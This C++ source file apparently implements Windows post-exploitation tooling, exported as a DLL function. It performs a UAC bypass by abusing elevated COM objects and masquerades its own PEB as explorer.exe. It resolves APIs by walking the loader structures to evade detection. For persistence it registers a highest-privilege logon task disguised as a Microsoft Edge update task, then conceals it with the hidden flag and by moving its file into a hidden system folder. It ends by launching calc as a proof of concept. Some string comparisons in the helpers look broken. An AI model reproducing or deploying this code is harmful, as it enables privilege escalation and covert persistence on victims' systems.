#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>

#include <iostream>
#include <winternl.h>
#include <Windows.h>
#include <taskschd.h>
#include <comdef.h>
#include <comutil.h>
#include <objbase.h>
#include <ntstatus.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")
#include <sddl.h>
#include <Aclapi.h>
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "ntdll.lib")
#include <fstream>
#include <string>
#include <filesystem>
#include <cstdlib>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")


#define T_CLSID_CMSTPLUA                     L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
#define T_IID_ICMLuaUtil                     L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}"
#define T_ELEVATION_MONIKER_ADMIN            L"Elevation:Administrator!new:"

#define UCM_DEFINE_GUID(name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8) \
     EXTERN_C const GUID DECLSPEC_SELECTANY name \
                = { l, w1, w2, { b1, b2,  b3,  b4,  b5,  b6,  b7,  b8 } }  

UCM_DEFINE_GUID(IID_ICMLuaUtil, 0x6EDD6D74, 0xC007, 0x4E75, 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C);

typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {

	BEGIN_INTERFACE

		HRESULT(STDMETHODCALLTYPE* QueryInterface)(
			__RPC__in ICMLuaUtil* This,
			__RPC__in REFIID riid,
			_COM_Outptr_  void** ppvObject);

	ULONG(STDMETHODCALLTYPE* AddRef)(
		__RPC__in ICMLuaUtil* This);

	ULONG(STDMETHODCALLTYPE* Release)(
		__RPC__in ICMLuaUtil* This);


	HRESULT(STDMETHODCALLTYPE* SetRasCredentials)(
		__RPC__in ICMLuaUtil* This);


	HRESULT(STDMETHODCALLTYPE* SetRasEntryProperties)(
		__RPC__in ICMLuaUtil* This);


	HRESULT(STDMETHODCALLTYPE* DeleteRasEntry)(
		__RPC__in ICMLuaUtil* This);


	HRESULT(STDMETHODCALLTYPE* LaunchInfSection)(
		__RPC__in ICMLuaUtil* This);


	HRESULT(STDMETHODCALLTYPE* LaunchInfSectionEx)(
		__RPC__in ICMLuaUtil* This);


	HRESULT(STDMETHODCALLTYPE* CreateLayerDirectory)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* ShellExec)(
		__RPC__in ICMLuaUtil* This,
		_In_     LPCTSTR lpFile,
		_In_opt_  LPCTSTR lpParameters,
		_In_opt_  LPCTSTR lpDirectory,
		_In_      ULONG fMask,
		_In_      ULONG nShow);

	END_INTERFACE

} *PICMLuaUtilVtbl;

interface ICMLuaUtil{ CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl; };

typedef BOOL(WINAPI* pOpenProcessToken)(
	_In_ HANDLE ProcessHandle,
	_In_ DWORD DesiredAccess,
	_Outptr_ PHANDLE TokenHandle
);


typedef BOOL(WINAPI* pGetTokenInformation)(
	_In_ HANDLE TokenHandle,
	_In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
	_Out_writes_bytes_to_opt_(TokenInformationLength, *ReturnLength) LPVOID TokenInformation,
	_In_ DWORD TokenInformationLength,
	_Out_ PDWORD ReturnLength
);


typedef HRESULT(*pCoInitializeEx)(
	_In_opt_ LPVOID pvReserved,
	_In_ DWORD dwCoInit
);


typedef HRESULT(*pCLSIDFromString)(
	_In_ LPCOLESTR lpsz,
	_Out_ LPCLSID pclsid
);


typedef HRESULT(*pCoGetObject)(_In_ LPCWSTR pszName, _In_opt_ BIND_OPTS* pBindOptions, _In_ REFIID riid, _Outptr_ void** ppv);


typedef VOID(*pCoUninitialize)(
	void
);


char* WcharToChar(WCHAR* wStr)
{
	int wcharLength = (int)(wcslen(wStr) + 1); // +1 for null terminator
	int charLength = WideCharToMultiByte(CP_ACP, 0, wStr, wcharLength, NULL, 0, NULL, NULL);
	char* charString = (char*)calloc(charLength * sizeof(char), 1);
	WideCharToMultiByte(CP_ACP, 0, wStr, wcharLength, charString, charLength, NULL, NULL);
	return charString;
}


void ExtractFilename(const wchar_t* fullPath, wchar_t* filename)
{
	const wchar_t* lastBackslash = wcsrchr(fullPath, L'\\');
	if (lastBackslash != NULL) {
		wcscpy_s(filename, MAX_PATH, lastBackslash + 1);
	}
	else {
		wcscpy_s(filename, MAX_PATH, fullPath);
	}
}


void* ByPeModuleX(WCHAR* lpModuleName)
{
	PPEB pPeb = 0;
	PLDR_DATA_TABLE_ENTRY pDataTableEntry = 0;
	PVOID DLLAddress = 0;

#ifdef _M_X64
	PPEB pPEB = (PPEB)__readgsqword(0x60); //ULONGLONG ProcessEnvironmentBlock;                                       //0x60 x64
#else
	//If 32 bits architecture
	PPEB pPEB = (PPEB)__readfsdword(0x30);
#endif

	PPEB_LDR_DATA pLdr = pPEB->Ldr;

	PLIST_ENTRY AddressFirstPLIST = &pLdr->InMemoryOrderModuleList;

	PLIST_ENTRY AddressFirstNode = AddressFirstPLIST->Flink;

	for (PLIST_ENTRY Node = AddressFirstNode; Node != AddressFirstPLIST; Node = Node->Flink)
	{
		Node = Node - 1;
		pDataTableEntry = (PLDR_DATA_TABLE_ENTRY)Node;

		wchar_t FullDLLName[MAX_PATH * 2] = { 0 };
		wcscpy_s(FullDLLName, MAX_PATH * 2, (wchar_t*)pDataTableEntry->FullDllName.Buffer);

		wchar_t filename[MAX_PATH * 2] = { 0 };
		ExtractFilename(FullDLLName, filename);

		char* dllName = WcharToChar(filename);
		CHAR* lpName = WcharToChar(lpModuleName);
		if (dllName == lpName)
		{
			DLLAddress = (PVOID)pDataTableEntry->DllBase;
			free(dllName);
			return DLLAddress;
		}
		Node = Node + 1;
	}

	return DLLAddress;
}


VOID* ByGetProcAddress(PVOID dllAddress, char* functionName)
{
	DWORD		j;
	uintptr_t rva = 0;

	const LPVOID BaseDLLAddr = (LPVOID)dllAddress;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER)BaseDLLAddr;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR)BaseDLLAddr + pImgDOSHead->e_lfanew);

	PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)BaseDLLAddr + pImgNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD Address = (PDWORD)((LPBYTE)BaseDLLAddr + pImgExpDir->AddressOfFunctions);

	PDWORD Name = (PDWORD)((LPBYTE)BaseDLLAddr + pImgExpDir->AddressOfNames);

	PWORD Ordinal = (PWORD)((LPBYTE)BaseDLLAddr + pImgExpDir->AddressOfNameOrdinals);

	for (j = 0; j < pImgExpDir->NumberOfNames; j++)
	{
		if ((char*)BaseDLLAddr + Name[j] == functionName)
		{
			rva = (uintptr_t)((LPBYTE)(uintptr_t)Address[Ordinal[j]]);
			break;
		}
	}

	if (rva)
	{
		uintptr_t moduleBase = (uintptr_t)BaseDLLAddr;
		uintptr_t* TrueAddress = (uintptr_t*)(moduleBase + rva);
		return (PVOID)TrueAddress;
	}
	else
	{
		return (PVOID)rva;
	}
}


HRESULT ucmAllocateElevatedObject(
	_In_ LPWSTR lpObjectCLSID,
	_In_ REFIID riid,
	_In_ DWORD dwClassContext,
	_Outptr_ void** ppv
)
{
	BOOL        bCond = FALSE;
	DWORD       classContext;
	HRESULT     hr = E_FAIL;
	PVOID       ElevatedObject = NULL;

	BIND_OPTS3  bop;
	WCHAR       szMoniker[MAX_PATH];

	do {

		if (wcslen(lpObjectCLSID) > 64)
			break;

		RtlSecureZeroMemory(&bop, sizeof(bop));
		bop.cbStruct = sizeof(bop);

		classContext = dwClassContext;
		if (dwClassContext == 0)
			classContext = CLSCTX_LOCAL_SERVER;

		bop.dwClassContext = classContext;

		wcscpy(szMoniker, T_ELEVATION_MONIKER_ADMIN);
		wcscat(szMoniker, lpObjectCLSID);

		hr = CoGetObject(szMoniker, (BIND_OPTS*)&bop, riid, &ElevatedObject);

	} while (bCond);

	*ppv = ElevatedObject;

	return hr;
}


NTSTATUS ucmCMLuaUtilShellExecMethod(
	_In_ LPWSTR lpszExecutable
)
{
	NTSTATUS         MethodResult	= STATUS_ACCESS_DENIED;
	HRESULT          r				= E_FAIL, hr_init;
	BOOL             bApprove		= FALSE;
	ICMLuaUtil*		 CMLuaUtil		= NULL;

	hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

	do {

		r = ucmAllocateElevatedObject(
			LPWSTR(T_CLSID_CMSTPLUA),
			IID_ICMLuaUtil,
			CLSCTX_LOCAL_SERVER,
			(void**)&CMLuaUtil);

		if (r != S_OK)
			break;

		if (CMLuaUtil == NULL) {
			r = E_OUTOFMEMORY;
			break;
		}

		r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil,
			lpszExecutable,
			NULL,
			NULL,
			SEE_MASK_DEFAULT,
			SW_SHOW);

		if (SUCCEEDED(r))
			MethodResult = STATUS_SUCCESS;

	} while (FALSE);

	if (CMLuaUtil != NULL) {
		CMLuaUtil->lpVtbl->Release(CMLuaUtil);
	}

	if (hr_init == S_OK)
		CoUninitialize();

	return MethodResult;
}

BOOL MasqueradePEB() {


	typedef struct _UNICODE_STRING {
		USHORT Length;
		USHORT MaximumLength;
		PWSTR  Buffer;
	} UNICODE_STRING, * PUNICODE_STRING;

	typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
		HANDLE ProcessHandle,
		DWORD ProcessInformationClass,
		PVOID ProcessInformation,
		DWORD ProcessInformationLength,
		PDWORD ReturnLength
		);

	typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection)(
		PRTL_CRITICAL_SECTION CriticalSection
		);

	typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection)(
		PRTL_CRITICAL_SECTION CriticalSection
		);

	typedef void (WINAPI* _RtlInitUnicodeString)(
		PUNICODE_STRING DestinationString,
		PCWSTR SourceString
		);

	typedef struct _LIST_ENTRY {
		struct _LIST_ENTRY* Flink;
		struct _LIST_ENTRY* Blink;
	} LIST_ENTRY, * PLIST_ENTRY;

	typedef struct _PROCESS_BASIC_INFORMATION
	{
		LONG ExitStatus;
		PVOID PebBaseAddress;
		ULONG_PTR AffinityMask;
		LONG BasePriority;
		ULONG_PTR UniqueProcessId;
		ULONG_PTR ParentProcessId;
	} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

	typedef struct _PEB_LDR_DATA {
		ULONG Length;
		BOOLEAN Initialized;
		HANDLE SsHandle;
		LIST_ENTRY InLoadOrderModuleList;
		LIST_ENTRY InMemoryOrderModuleList;
		LIST_ENTRY InInitializationOrderModuleList;
		PVOID EntryInProgress;
		BOOLEAN ShutdownInProgress;
		HANDLE ShutdownThreadId;
	} PEB_LDR_DATA, * PPEB_LDR_DATA;

	typedef struct _RTL_USER_PROCESS_PARAMETERS {
		BYTE           Reserved1[16];
		PVOID          Reserved2[10];
		UNICODE_STRING ImagePathName;
		UNICODE_STRING CommandLine;
	} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;


	typedef struct _PEB {
		BOOLEAN InheritedAddressSpace;
		BOOLEAN ReadImageFileExecOptions;
		BOOLEAN BeingDebugged;
		union
		{
			BOOLEAN BitField;
			struct
			{
				BOOLEAN ImageUsesLargePages : 1;
				BOOLEAN IsProtectedProcess : 1;
				BOOLEAN IsLegacyProcess : 1;
				BOOLEAN IsImageDynamicallyRelocated : 1;
				BOOLEAN SkipPatchingUser32Forwarders : 1;
				BOOLEAN SpareBits : 3;
			};
		};
		HANDLE Mutant;

		PVOID ImageBaseAddress;
		PPEB_LDR_DATA Ldr;
		PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
		PVOID SubSystemData;
		PVOID ProcessHeap;
		PRTL_CRITICAL_SECTION FastPebLock;
	} PEB, * PPEB;

	typedef struct _LDR_DATA_TABLE_ENTRY {
		LIST_ENTRY InLoadOrderLinks;
		LIST_ENTRY InMemoryOrderLinks;
		union
		{
			LIST_ENTRY InInitializationOrderLinks;
			LIST_ENTRY InProgressLinks;
		};
		PVOID DllBase;
		PVOID EntryPoint;
		ULONG SizeOfImage;
		UNICODE_STRING FullDllName;
		UNICODE_STRING BaseDllName;
		ULONG Flags;
		WORD LoadCount;
		WORD TlsIndex;
		union
		{
			LIST_ENTRY HashLinks;
			struct
			{
				PVOID SectionPointer;
				ULONG CheckSum;
			};
		};
		union
		{
			ULONG TimeDateStamp;
			PVOID LoadedImports;
		};
	} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

	DWORD dwPID;
	PROCESS_BASIC_INFORMATION pbi;
	PPEB peb;
	PPEB_LDR_DATA pld;
	PLDR_DATA_TABLE_ENTRY ldte;

	HMODULE hNtdll = (HMODULE)ByPeModuleX((WCHAR*)L"ntdll.dll");

	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)
		ByGetProcAddress(hNtdll, (CHAR*)"NtQueryInformationProcess");
	if (NtQueryInformationProcess == NULL) {
		return FALSE;
	}

	_RtlEnterCriticalSection RtlEnterCriticalSection = (_RtlEnterCriticalSection)
		ByGetProcAddress(hNtdll, (CHAR*)"RtlEnterCriticalSection");
	if (RtlEnterCriticalSection == NULL) {
		return FALSE;
	}

	_RtlLeaveCriticalSection RtlLeaveCriticalSection = (_RtlLeaveCriticalSection)
		ByGetProcAddress(hNtdll, (CHAR*)"RtlLeaveCriticalSection");
	if (RtlLeaveCriticalSection == NULL) {
		return FALSE;
	}

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		ByGetProcAddress(hNtdll, (CHAR*)"RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return FALSE;
	}

	dwPID = GetCurrentProcessId();
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
	if (hProcess == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);

	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
		return FALSE;
	}

	if (!ReadProcessMemory(hProcess, &peb->Ldr, &pld, sizeof(pld), NULL)) {
		return FALSE;
	}


	WCHAR chExplorer[MAX_PATH + 1];
	GetWindowsDirectoryW(chExplorer, MAX_PATH);
	wcscat_s(chExplorer, sizeof(chExplorer) / sizeof(wchar_t), L"\\explorer.exe");

	LPWSTR pwExplorer = (LPWSTR)malloc(MAX_PATH);
	wcscpy_s(pwExplorer, MAX_PATH, chExplorer);


	RtlEnterCriticalSection(peb->FastPebLock);


	RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, pwExplorer);
	RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, pwExplorer);


	WCHAR wFullDllName[MAX_PATH];
	WCHAR wExeFileName[MAX_PATH];
	GetModuleFileName(NULL, wExeFileName, MAX_PATH);

	LPVOID pStartModuleInfo = peb->Ldr->InLoadOrderModuleList.Flink;
	LPVOID pNextModuleInfo = pld->InLoadOrderModuleList.Flink;
	do
	{

		if (!ReadProcessMemory(hProcess, &pNextModuleInfo, &ldte, sizeof(ldte), NULL)) {
			return FALSE;
		}


		if (!ReadProcessMemory(hProcess, (LPVOID)ldte->FullDllName.Buffer, (LPVOID)&wFullDllName, ldte->FullDllName.MaximumLength, NULL))
		{
			return FALSE;
		}

		if (_wcsicmp(wExeFileName, wFullDllName) == 0) {
			RtlInitUnicodeString(&ldte->FullDllName, pwExplorer);
			RtlInitUnicodeString(&ldte->BaseDllName, pwExplorer);
			break;
		}

		pNextModuleInfo = ldte->InLoadOrderLinks.Flink;

	} while (pNextModuleInfo != pStartModuleInfo);


	RtlLeaveCriticalSection(peb->FastPebLock);


	CloseHandle(hProcess);

	if (_wcsicmp(chExplorer, wFullDllName) == 0) {
		return FALSE;
	}

	return TRUE;
}


std::wstring GetCurrentExecutablePath() {
	wchar_t buffer[MAX_PATH];
	GetModuleFileNameW(NULL, buffer, MAX_PATH);
	return std::wstring(buffer);
}

std::wstring GetTaskXml(const std::wstring& executablePath) {
	return L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>\
<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\
  <Principals>\
    <Principal>\
      <RunLevel>HighestAvailable</RunLevel>\
    </Principal>\
  </Principals>\
  <Triggers>\
    <LogonTrigger>\
      <Enabled>true</Enabled>\
    </LogonTrigger>\
  </Triggers>\
  <Actions Context=\"Author\">\
    <Exec>\
      <Command>cmd</Command>\
      <Arguments>/c start """" " + executablePath + L"</Arguments>\
    </Exec>\
  </Actions>\
</Task>";
}

static const IID IID_IElevatedFactoryServer =
{ 0x804bd226, 0xaf47, 0x4d71, { 0xb4, 0x92, 0x44, 0x3a, 0x57, 0x61, 0x0b, 0x08 } };
interface IElevatedFactoryServer : public IUnknown{
	virtual HRESULT STDMETHODCALLTYPE ServerCreateElevatedObject(REFCLSID rclsid, REFIID riid, void** ppv) = 0;
};


bool IsProcessRunningAsAdmin() {

	HMODULE advApi = NULL;

	/*advApi = (HMODULE)ByPeModuleX(const_cast<WCHAR*>(L"advapi32.dll"));

	pOpenProcessToken		myOpenProcessToken		= (pOpenProcessToken)ByGetProcAddress(advApi, (CHAR*)("OpenProcessToken"));
	pGetTokenInformation	myGetTokenInformation	= (pGetTokenInformation)ByGetProcAddress(advApi, (CHAR*)("GetTokenInformation"));*/
	
	HANDLE hToken = nullptr;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		std::cout << "Failed to open process token: " << GetLastError() << std::endl;
		return false;
	}

	TOKEN_ELEVATION elevation;
	DWORD dwSize;
	if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
		std::cout << "Failed to get token information: " << GetLastError() << std::endl;
		CloseHandle(hToken);
		return false;
	}

	CloseHandle(hToken);
	return elevation.TokenIsElevated != 0;
}


int task() {
	std::wstring currentExecutablePath = GetCurrentExecutablePath();
	std::wstring taskXml = GetTaskXml(currentExecutablePath);
	const wchar_t* TASK_XML = taskXml.c_str();

	if (!IsProcessRunningAsAdmin()) {
		MasqueradePEB();
	}

	/*HMODULE oleApi = NULL;

	oleApi = (HMODULE)ByPeModuleX((WCHAR*)L"ole32.dll");

	pCoInitializeEx myCoInitializeEx = (pCoInitializeEx)ByGetProcAddress(oleApi, (CHAR*)"CoInitializeEx");

	pCLSIDFromString myCLSIDFromString = (pCLSIDFromString)ByGetProcAddress(oleApi, (CHAR*)"CLSIDFromString");

	pCoGetObject myCoGetObject = (pCoGetObject)ByGetProcAddress(oleApi, (CHAR*)"CoGetObject");

	pCoUninitialize myCoUninitialize = (pCoUninitialize)ByGetProcAddress(oleApi, (CHAR*)"CoUninitialize");*/

	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr)) {
		std::cerr << "CoInitializeEx failed: " << hr << std::endl;
		return 1;
	}

	try {
		CLSID clsidElevatedFactoryServer;
		hr = CLSIDFromString(L"{A6BFEA43-501F-456F-A845-983D3AD7B8F0}", &clsidElevatedFactoryServer);

		BIND_OPTS3 bo;
		memset(&bo, 0, sizeof(bo));
		bo.cbStruct = sizeof(bo);
		bo.dwClassContext = CLSCTX_LOCAL_SERVER;
		IElevatedFactoryServer* pElevatedFactoryServer = NULL;
		hr = CoGetObject(L"Elevation:Administrator!new:{A6BFEA43-501F-456F-A845-983D3AD7B8F0}", &bo, IID_IElevatedFactoryServer, (void**)&pElevatedFactoryServer);
		if (FAILED(hr)) {
			std::cerr << "CoGetObject failed: " << hr << std::endl;
			return 1;
		}

		ITaskService* pTaskService = NULL;
		CLSID clsidTaskService;
		hr = CLSIDFromString(L"{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}", &clsidTaskService);

		hr = pElevatedFactoryServer->ServerCreateElevatedObject(clsidTaskService, IID_ITaskService, (void**)&pTaskService);
		if (FAILED(hr)) {
			std::cerr << "ServerCreateElevatedObject failed: " << hr << std::endl;
			return 1;
		}

		hr = pTaskService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
		if (FAILED(hr)) {
			std::cerr << "Connect failed: " << hr << std::endl;
			return 1;
		}

		ITaskFolder* pRootFolder = NULL;
		hr = pTaskService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
		if (FAILED(hr)) {
			std::cerr << "GetFolder failed: " << hr << std::endl;
			return 1;
		}

		hr = pRootFolder->DeleteTask(_bstr_t(L"MicrosoftEdgeUpdateTaskMachineTime"), 0);
		if (SUCCEEDED(hr)) {
			std::cout << "Deleted existing task: MicrosoftEdgeUpdateTaskMachineTime" << std::endl;
		}

		IRegisteredTask* pRegisteredTask = NULL;
		hr = pRootFolder->RegisterTask(_bstr_t(L"MicrosoftEdgeUpdateTaskMachineTime"), _bstr_t(TASK_XML),
			TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(L""),
			&pRegisteredTask);

		if (SUCCEEDED(hr)) {
			std::cout << "Registered new task: MicrosoftEdgeUpdateTaskMachineTime" << std::endl; pRegisteredTask->Release();
		}
		else { std::cerr << "Failed to register new task: MicrosoftEdgeUpdateTaskMachineTime" << std::endl; }


		pRootFolder->Release();
		pTaskService->Release();
		pElevatedFactoryServer->Release();

	}
	catch (const _com_error& e) {
		std::cerr << "Error: " << e.ErrorMessage() << std::endl;
	}

	CoUninitialize();
	return 0;
}

HRESULT HideScheduledTask(const WCHAR* taskName, bool isSystemTask = true) {
	HRESULT hr = S_OK;
	ITaskService* pTaskService = nullptr;
	ITaskFolder* pTaskFolder = nullptr;
	IRegisteredTask* pRegisteredTask = nullptr;
	ITaskDefinition* pTaskDef = nullptr;
	ITaskSettings* pTaskSettings = nullptr;
	BSTR folderPath = nullptr;
	IRegisteredTask* pNewRegisteredTask = nullptr;  // 接收RegisterTaskDefinition的输出

	// 1. 初始化COM库（线程模型需匹配）
	hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
	if (FAILED(hr)) {
		printf("CoInitializeEx failed, error: 0x%08X\n", hr);
		return -1;
	}

	// 2. 创建TaskService对象
	hr = CoCreateInstance(
		CLSID_TaskScheduler,
		nullptr,
		CLSCTX_INPROC_SERVER,
		IID_ITaskService,
		(void**)&pTaskService
	);
	if (FAILED(hr)) {
		printf("CoCreateInstance(TaskScheduler) failed, error: 0x%08X\n", hr);
		return -1;
	}

	// 3. 连接到本地任务计划程序
	hr = pTaskService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
	if (FAILED(hr)) {
		printf("ITaskService::Connect failed, error: 0x%08X\n", hr);
		return -1;
	}

	// 4. 打开任务所在文件夹
	if (isSystemTask) {
		folderPath = SysAllocString(L"\\");  // 系统级任务根目录
	}
	else {
		WCHAR userName[MAX_PATH] = { 0 };
		DWORD userNameLen = MAX_PATH;
		if (!GetUserNameW(userName, &userNameLen)) {
			hr = HRESULT_FROM_WIN32(GetLastError());
			printf("GetUserNameW failed, error: 0x%08X\n", hr);
			return -1;
		}
		int pathLen = wcslen(L"\\User\\") + wcslen(userName) + 1;
		folderPath = SysAllocStringLen(nullptr, pathLen);
		wcscpy_s((WCHAR*)folderPath, pathLen, L"\\User\\");
		wcscat_s((WCHAR*)folderPath, pathLen, userName);
	}

	hr = pTaskService->GetFolder(folderPath, &pTaskFolder);
	if (FAILED(hr)) {
		printf("ITaskService::GetFolder failed (路径：%ls), error: 0x%08X\n", folderPath, hr);
		return -1;
	}

	// 5. 获取已注册任务（IRegisteredTask）
	BSTR taskPath = SysAllocString(taskName);
	hr = pTaskFolder->GetTask(taskPath, &pRegisteredTask);
	SysFreeString(taskPath);//Error: Task "%ls" not found (please create this task first)
	if (FAILED(hr)) {
		if (hr == HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND)) {
			printf("Error: Task %ls not found (please create this task first)", taskName);
		}
		else if (hr == HRESULT_FROM_WIN32(ERROR_ACCESS_DENIED)) {
			printf("Error: Insufficient permissions! You need to run as an administrator\n");
		}
		else {
			printf("ITaskFolder::GetTask failed, error: 0x%08X\n", hr);
		}
		return -1;
	}

	// 6. 获取任务定义（ITaskDefinition）
	hr = pRegisteredTask->get_Definition(&pTaskDef);
	if (FAILED(hr)) {
		printf("IRegisteredTask::get_Definition failed, error: 0x%08X\n", hr);
		return -1;
	}

	// 7. 设置任务隐藏属性
	hr = pTaskDef->get_Settings(&pTaskSettings);
	if (FAILED(hr)) {
		printf("ITaskDefinition::get_Settings failed, error: 0x%08X\n", hr);
		return -1;
	}
	hr = pTaskSettings->put_Hidden(VARIANT_TRUE);
	if (FAILED(hr)) {
		printf("ITaskSettings::put_Hidden failed, error: 0x%08X\n", hr);
		return -1;
	}

	// 8. 正确调用 RegisterTaskDefinition（核心修复部分）
	// 初始化 VARIANT 参数：必须显式设置为 VT_EMPTY（空值）
	VARIANT varUserId, varPassword, varSddl;
	VariantInit(&varUserId);    // 初始化用户ID（空=当前用户）
	VariantInit(&varPassword);  // 初始化密码（空=无需密码）
	VariantInit(&varSddl);      // 初始化安全描述符（空=使用默认）

	// 注册标志：TASK_CREATE_OR_UPDATE（存在则更新，不存在则创建）
	const LONG REGISTER_FLAGS = TASK_CREATE_OR_UPDATE;

	// 登录类型：匹配当前用户场景（交互式登录，无需用户名密码）
	const TASK_LOGON_TYPE LOGON_TYPE = TASK_LOGON_INTERACTIVE_TOKEN;

	// 调用接口（参数顺序和类型完全匹配原型）
	hr = pTaskFolder->RegisterTaskDefinition(
		taskPath ? taskPath : SysAllocString(taskName),  // path：任务名称
		pTaskDef,                                       // pDefinition：修改后的任务定义
		REGISTER_FLAGS,                                 // flags：注册标志
		varUserId,                                      // userId：空（当前用户）
		varPassword,                                    // password：空（无需密码）
		LOGON_TYPE,                                     // logonType：交互式登录
		varSddl,                                        // sddl：默认安全描述符
		&pNewRegisteredTask                             // ppTask：输出注册后的任务（可选，可传NULL）
	);

	// 释放 VARIANT 资源（必须调用，避免内存泄漏）
	VariantClear(&varUserId);
	VariantClear(&varPassword);
	VariantClear(&varSddl);

	if (SUCCEEDED(hr)) {
		printf("Success! The task %ls has been hidden, registered handle:%p\n", taskName, pNewRegisteredTask);
	}
	else {
		printf("RegisterTaskDefinition failed, error:0x%08X\n", hr);
		if (hr == HRESULT_FROM_WIN32(ERROR_INVALID_PARAMETER)) {
			printf("Reason: Parameter error (check VARIANT initialization or logonType match)\n");
		}
		else if (hr == HRESULT_FROM_WIN32(ERROR_ACCESS_DENIED)) {
			printf("Reason: Insufficient permissions (system tasks require administrator rights and a matching login type)\n");
		}
	}

Cleanup:
	// 释放所有COM对象（按创建顺序反向释放）
	if (pNewRegisteredTask) pNewRegisteredTask->Release();
	if (pTaskSettings) pTaskSettings->Release();
	if (pTaskDef) pTaskDef->Release();
	if (pRegisteredTask) pRegisteredTask->Release();
	if (pTaskFolder) pTaskFolder->Release();
	if (pTaskService) pTaskService->Release();
	if (folderPath) SysFreeString(folderPath);
	CoUninitialize();
	return hr;
}


void MoveTaskToHiddenFolder(const WCHAR* taskName) {
	WCHAR srcPath[MAX_PATH] = { 0 };
	WCHAR dstFolder[MAX_PATH] = { 0 };
	WCHAR dstPath[MAX_PATH] = { 0 };

	// 系统任务源路径：C:\Windows\System32\Tasks\<taskName>
	swprintf_s(srcPath, MAX_PATH, L"C:\\Windows\\System32\\Tasks\\%ls", taskName);
	// 隐藏目录：C:\Windows\System32\Tasks\HiddenTasks（设置隐藏属性）
	swprintf_s(dstFolder, MAX_PATH, L"C:\\Windows\\System32\\Tasks\\HiddenTasks");

	// 创建隐藏目录（若不存在）
	if (!PathFileExistsW(dstFolder)) {
		CreateDirectoryW(dstFolder, nullptr);
		SetFileAttributesW(dstFolder, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);  // 系统+隐藏属性
	}

	// 目标路径
	swprintf_s(dstPath, MAX_PATH, L"%ls\\%ls", dstFolder, taskName);

	// 移动任务文件（覆盖已存在）
	if (MoveFileExW(srcPath, dstPath, MOVEFILE_REPLACE_EXISTING)) {
		printf("The task has been moved to the hidden directory:%ls\n", dstFolder);
	}
	else {
		printf("Move task failed, error code:%lu\n", GetLastError());
	}
}


//int main() 
extern __declspec (dllexport) int CreateServiceInit()
{
	const WCHAR* targetTask = L"MicrosoftEdgeUpdateTaskMachineTime";

	task();

	HRESULT hr = HideScheduledTask(targetTask, true);

	MoveTaskToHiddenFolder(targetTask);

	system("calc");

	return 0;
}
